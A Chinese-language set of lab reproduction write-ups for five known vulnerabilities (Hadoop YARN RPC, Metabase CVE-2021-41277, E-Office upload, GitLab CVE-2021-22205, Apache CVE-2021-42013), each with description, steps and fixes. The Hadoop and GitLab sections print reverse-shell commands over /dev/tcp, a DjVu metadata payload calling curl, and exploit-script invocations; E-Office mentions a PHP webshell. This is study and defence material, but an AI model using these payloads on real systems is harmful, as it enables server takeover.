Hadoop Yarn RPC

未授权访问|高危


漏洞描述

Apache Hadoop YARN （Yet Another Resource Negotiator）是一种新的 Hadoop 资源管理器，它是一个通用资源管理系统，可为上层应用提供统一的资源管理和调度，它的引入为集群在利用率、资源统一管理和数据共享等方面带来了巨大好处。
Hadoop Yarn默认对外开放RPC服务，攻击者可利用RPC服务执行任意命令，进而控制服务器。同时由于Hadoop Yarn RPC服务访问控制机制开启方式与REST API不一样，因此即使在 REST API有授权认证的情况下，RPC服务所在端口仍然可以未授权访问。


本地复现


1、下载安装环境

https://downloads.apache.org/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz

2、在kali Linux下进行安装
#解压文件tar -zxvf hadoop-3.3.0.tar.gz#需要先找到本地JAVA安装路径，靶机环境的路径如下/usr/lib/jvm/java-11-openjdk-amd64/#修改配置文件，加入JAVA_HOMEvi /etc/hadoop/hadoop-env.shexport JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/#如果本地没有新建hadoop用户而直接用root运行hadoop,还需要在hadoop-env.sh中加入以下环境变量vi /etc/hadoop/hadoop-env.sh#在尾部追加export HDFS_NAMENODE_USER=rootexport HDFS_DATANODE_USER=rootexport HDFS_SECONDARYNAMENODE_USER=rootexport YARN_RESOURCEMANAGER_USER=rootexport YARN_NODEMANAGER_USER=root#生成公钥和私钥ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsacat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys#设置权限，owner有读写权限，group和other无权限chmod 0600 ~/.ssh/authorized_keys

3、启动环境
cd sbin./start-all.sh


4、http://192.168.0.126:8088访问页面正常


5、使用工具执行dnslog，执行成功


6、反弹shell，本地nc监听6666端口，使用工具写入shell
"echo 'bash -i >& /dev/tcp/192.168.0.66/6666 0>&1' > /tmp/1.sh""/bin/bash /tmp/1.sh"


7、执行脚本，成功反弹



修复方法
1、Apache Hadoop官方建议用户开启Kerberos认证；
2、限制Hadoop RPC端口对外开放

Metabase 敏感信息泄漏

CVE-2021-41277 |高危


漏洞描述

Metabase是一个开源数据分析平台。在受影响的版本中，已发现自定义 GeoJSON 地图（admin->settings->maps->custom maps->add a map）支持和潜在的本地文件包含（包括环境变量）存在安全问题。在加载之前未验证 URL。此问题已在新的维护版本（0.40.5 和 1.40.5）以及之后的任何后续版本中修复。如果您无法立即升级，您可以通过在反向代理或负载均衡器或 WAF 中包含规则以在应用程序之前提供验证过滤器来缓解这种情况。


影响版本：<0.40.5和<1.40.5< span="">


本地复现


1、使用Vulfocus靶场复现，直接拉起docker镜像


2、访问漏洞地址http://192.168.0.126:46238/


3、执行poc，查看/etc/password文件


修复方法

1、升级至安全版本，https://github.com/metabase/metabase

泛微E-Office文件上传漏洞

CNVD-2021-49104 |高危


漏洞描述

泛微e-office是泛微旗下的一款标准协同移动办公平台。由于泛微 E-Office v9.0 上传模块中未能正确处理用户的传输数据，导致攻击者能够构造并上传恶意文件，从而执行远程命令并控制目标服务器。


本地复现


1、构造poc，写入phpinfo文件。访问phpinfo.php，写入成功


2、上传php一句话木马


3、通过菜刀连接，获取服务器权限



修复方法

1、厂商已经发布了解决方案，建议用户下载使用：

http://v10.e-office.cn/eoffice9update/safepack.zip

Gitlab 远程命令执行漏洞


CVE-2021-22205|高危


漏洞描述

当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。


l漏洞代码如下：#convert C escape sequences 出现以下代码$tok = eval qq{"$tok"};

由于 GitLab 没有正确验证传递给文件解析器的图像文件，攻击者可利用该漏洞在服务端进行远程命令执行。


影响版本：

11.9 <= Gitlab CE/EE < 13.8.8

13.9 <= Gitlab CE/EE < 13.9.6

13.10 <= Gitlab CE/EE < 13.10.3


本地复现


1、使用Vulfocus靶场复现，直接拉起docker镜像


2、启用先进入docker，修改下root的密码（因为懒得注册）还是用root好点，进入docker执行如下命令，进入控制台，然后修改root密码

gitlab-rails console -e production  （进入控制台）


3、修改root密码后，使用root账号登录，点击Profiel，然后进入snippets


4、先通过dnslog生成一个域名，然后再本地写入如下exp

(metadata               (Copyright "\" . qx{curl ilfhaz.dnslog.cn}  . \" b "))


5、注意该漏洞利用需要djvu格式的图片，因此先在kali下安装djvulibre软件，安装命令如下

apt-get install -y djvulibre-bin


6、安装后将该刚才写入的exp生成为图片，执行如下命令

djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=gitlab.txt && mv rce.djvu rce.jpg


7、生成后在gitlab中导入图片


8、查看dnslog，成功执行


9、使用工具验证，反弹shell

python3 CVE-2021-2205.py -a true -t http://192.168.0.175:15579/ -c "echo 'bash -i >& /dev/tcp/192.168.0.66/6666 0>&1' > /tmp/2.sh"


10.执行shell，反弹shell成功

python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "/bin/bash /tmp/2.sh"


修复方法

1、目前官方已经发布新版本，尽快升级至最新安全版本：

https://about.gitlab.com/releases/

Apache 远程代码执行


CVE-2021-42013|高危



漏洞描述

 Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 ApacheHTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。


本地复现


1、使用Vulfocus靶场复现，直接拉起docker镜像


2、访问漏洞地址，确认Apache版本号为2.4.50


3、使用脚本获取服务器权限，执行任意命令


修复方法

1、官方已经发布新版本，建议受影响的用户立即升级更新到Apache HTTP Server 2.4.51或更高版本
